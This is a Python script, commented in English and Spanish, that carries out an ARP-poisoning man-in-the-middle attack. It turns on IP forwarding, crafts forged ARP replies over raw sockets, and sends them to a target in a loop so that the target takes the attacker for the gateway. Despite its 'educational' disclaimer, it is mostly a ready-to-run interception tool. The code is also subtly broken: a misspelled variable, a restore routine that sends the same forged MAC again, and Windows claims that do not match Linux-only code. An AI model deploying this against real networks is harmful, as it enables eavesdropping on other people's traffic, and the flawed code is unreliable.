'''
This program aims to carry out a Man in the Middle attack by poisoning the Address Resolution Protocol (ARP), all of this is with educational fines and should be used with caution on a network where you have permissions.

Este programa pretende realizar un ataque de Hombre en el Medio mediante envenenamiento de Protocolo de Resolución de Direcciones (PRD), todo esto es con fines educativos y se debe de usar con precaución en una red en la que se tengan permisos
'''
import argparse
import os
import socket
import struct
import sys
import time
from binascii import unhexlify

def _enable_linux_iproute():
    '''
    Enables IP routing on Linux based systems
    Habilita el enrutamiento IP en sistemas basados en Linux
    '''
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        print(" [+] IP Forwarding enabled successfully. | [+] Enrutamiento IP activado exitosamente.")
    except Exception as e:
        print(f"[-] Error enabling IP Forwarding: {e}   | [-] Error al activar el enrutamiento IP: {e}")
        sys.exit(1)

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding on Windows
    Habilita enrutamiento IP en Windows
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            if f.read().strip() == '1':
                return
    except FileNotFoundError:
        print(f"[-] Error: /proc/sys/net/ipv4/ip_forward not found. Ensure you are running this on a Linux system. | [-] Error: /proc/sys/net/ipv4/ip_forward no encontrado. Asegurate de ejecutar esto en un sistema Linux.")
        sys.exit(1)

    _enable_linux_iproute()

def build_arp_packet(target_mac, target_ip, source_mac, source_ip):
    """
    Recieves as parameter the MAC address and the IP address

    Recibe como parámetro la MAC y la IP, tanto del host como del target 

    Builds an ARP packet manually

    Construye una trama ARP manualmente

    It is used to create an ARP response that tricks the victim into believing that the attacker's MAC address is associated with the IP address of the gateway.

    Se utiliza para crear una respuesta ARP que engañe a la víctima haciéndole creer que la dirección MAC del atacante está asociada con la dirección IP de la puerta de enlace (gateway).
    """
    # ARP request
    ethertype = 0x0806
    hardware_type = 0x0001
    protocol_type = 0x0800
    hardware_size = 0x06
    protocol_size = 0x04
    opcode = 0x0002  # ARP reply

    '''
    Build Ethernet frame

    Construcción del marco Ethernet

    The function begins by building the Ethernet framework. An Ethernet frame consists of source and destination MAC addresses, followed by the protocol type. In this case, the protocol type is set to 0x0806

    La función comienza construyendo el marco Ethernet. Un marco Ethernet consta de direcciones MAC de origen y destino, seguidas por el tipo de protocolo. En este caso, el tipo de protocolo se establece en 0x0806
    
    ''' 
    ether_frame = struct.pack("!6s6sH", unhexlify(target_mac.replace(":", "")),
                              unhexlify(source_mac.replace(":", "")), ethertype)

    '''
    Build ARP packet
    construye el paquete ARP
    ''' 
    arp_packet = struct.pack("!HHBBH6s4s6s4s", hardware_type, protocol_type, hardware_size, protocol_size, opcode,
                             unhexlify(source_mac.replace(":", "")), socket.inet_aton(source_ip),
                             unhexlify(target_mac.replace(":", "")), socket.inet_aton(target_ip))

    '''
    The function returns the concatenation of the Ethernet frame and the ARP packet, which forms the complete ARP frame.

    La función devuelve la concatenación del marco Ethernet y el paquete ARP, que forma la trama ARP completa.
    '''
    return ether_frame + arp_packet

def get_mac(ip, iface): 
    """
    Sends an ARP request and waits for a response to obtain the MAC address associated with a specific IP address on the local network.

    Envía una solicitud ARP y espera una respuesta para obtener la dirección MAC asociada a una dirección IP específica en la red local.

    Receives as parameters the IP and the network interface used
    
    Recibe como parametro la IP y la interfaz de red utilizada
    
    Returns MAC address of any device connected to the network, If ip is down or MAC address cannot be obtained, returns None

    Regresa la dirección MAC de cualquier dispositivo conectado a la red, si la IP no funciona o la dirección MAC no se puede obtener, regresa none
    """
    try:
        # Create a raw socket to send ARP requests
        # Crea un nuevo socket en crudo para enviar peticiones ARP
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)) as s:
            s.bind((iface, socket.SOCK_RAW))

            # ARP request
            arp_request = struct.pack('!HHBBH6s4s6s4s', 0x0001, 0x0800, 6, 4, 0x0001, unhexlify('ff'*6),
                                      socket.inet_aton('0.0.0.0'), unhexlify('00'*6), socket.inet_aton(ip))

            s.send(arp_request)

            # Waits and analize ARP responses
            # Espera y analiza respuestas ARP
            while True:
                packet = s.recvfrom(2048)
                ethertype = struct.unpack('!H', packet[0][12:14])[0]

                if ethertype == 0x0806:  # ARP packet
                    opcode = struct.unpack('!H', packet[0][20:22])[0]

                    if opcode == 0x0002:  # ARP reply
                        mac = ':'.join(format(x, '02x') for x in packet[0][22:28])
                        return mac

    except Exception as e:
        print(f"[-] Error getting MAC address for {ip}: {e} | [-] Error obteniendo la dirección MAC para {ip}: {e}")

    return None

def spoof(target_ip, host_ip, iface, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.It is accomplished by changing the ARP cache of the target (poisoning).

    Falsifica `target_ip` diciendo que somos `host_ip`. Se logra cambiando el caché ARP del objetivo (envenenamiento).
    """
    try:
        while True:
            # get the MAC address of the host
            host_mac = get_mac(host_ip, iface)
            if host_mac is None:
                return

            # try to get the MAC address of the target until successful
            target_mac = get_mac(target_ip, iface)
            if target_mac:
                # build ARP packet
                arp_packet = build_arp_packet("ff:ff:ff:ff:ff:ff", target_ip, "12:34:56:78:9a:bc", host_ip)
                # send the packet
                sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
                sock.bind((iface, socket.htons(0x0800)))
                sock.send(arp_packet)
                sock.close()

                if verbose:
                    print(f"[+] Sent ARP packet to {target_ip} claiming to be {host_ip} | [+] Enviando paquete ARP a {tarjet_ip} aclamando ser {host_ip}")

            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait... | [!] CTRL+C detectado. Restaurando la red, por favor espere ...")
        restore(target_ip, host_ip, iface)

def restore(target_ip, host_ip, iface, verbose=True):
    """
    Restores the normal process of a regular network. This is done by sending the original information
    (real IP and MAC of `host_ip` ) to `target_ip`

    Restaura el funcionamiento regular de la red. Esto es hecho enviando la información original a la IP objetivo
    """
    try:
        # get the real MAC address of target
        target_mac = get_mac(target_ip, iface)
        # get the real MAC address of spoofed (gateway, i.e router)
        host_mac = get_mac(host_ip, iface)
        # crafting the restoring packet
        arp_response = build_arp_packet("ff:ff:ff:ff:ff:ff", target_ip, "12:34:56:78:9a:bc", host_ip)
        # sending the restoring packet
        # to restore the network to its normal process
        # we send each reply seven times for a good measure (count=7)
        sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        sock.bind((iface, socket.htons(0x0800)))
        sock.send(arp_response * 7)
        sock.close()

        if verbose:
            print(f"[+] Sent ARP restoration packet to {target_ip} with real MAC {host_ip} | Enviando paquete ARP de restauración a {target_ip} con la MAC real {host_ip}")

    except Exception as e:
        print(f"[-] Error restoring ARP: {e} | [-] Error restaurando ARP: {e}")

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("host", help="Host IP address")
    parser.add_argument("--iface", help="Network interface (e.g., eth0)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose mode")
    return parser.parse_args()

if __name__ == "__main__":
    args = get_arguments()
    target = args.target
    host = args.host
    iface = args.iface
    verbose = args.verbose

    enable_ip_route(verbose)

    try:
        spoof(target, host, iface, verbose)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait... | [!] CTRL+C detectado. Restaurando la red, por favor espere ...")
        restore(target, host, iface)
        